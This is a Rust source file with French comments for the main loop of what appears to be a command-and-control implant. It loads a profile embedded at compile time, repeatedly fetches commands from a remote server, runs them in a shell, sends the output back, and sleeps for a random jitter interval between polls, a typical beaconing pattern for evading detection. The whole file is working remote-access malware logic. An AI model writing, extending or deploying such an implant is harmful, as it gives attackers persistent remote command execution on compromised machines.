mod codec;
mod garbage;
mod models;
mod profile;
mod http;
mod executor;

use rand::Rng;
use reqwest::Client;
use tokio::time::{sleep, Duration};
use models::CommandResponse;
use profile::Profiles;

#[tokio::main]
async fn main() {
    // Charger le profile (embarqué à la compilation)
    let profiles = match Profiles::load() {
        Ok(p) => p,
        Err(e) => {
            eprintln!("Failed to load profile: {}", e);
            return;
        }
    };

    // Récupérer les paramètres du profile
    let api_url = profiles.api_url.as_deref().unwrap_or("http://localhost:8000");
    let jitter_min = profiles.jitter_min.unwrap_or(3);
    let jitter_max = profiles.jitter_max.unwrap_or(7);
    let next_route = profiles.next_command_route.as_deref().unwrap_or("/commands/next");
    let response_route = profiles.command_response_route.as_deref().unwrap_or("/commands/");

    let client = Client::builder().build().unwrap();

    let shell = profiles.get_shell().to_string();

    loop {
        // Récupérer et décoder la commande du serveur
        if let Some(cmd) = http::get_command(&client, api_url, &profiles.server, next_route).await {
            // Exécuter la commande
            let output = executor::execute(&cmd.text, &shell).await;

            // Encoder et envoyer la réponse
            let response = CommandResponse { output };
            let _ = http::send_response(&client, api_url, &profiles.client, cmd.id, &response, response_route).await;
        }

        // Jitter aléatoire
        let secs = rand::thread_rng().gen_range(jitter_min..=jitter_max);
        sleep(Duration::from_secs(secs)).await;
    }
}
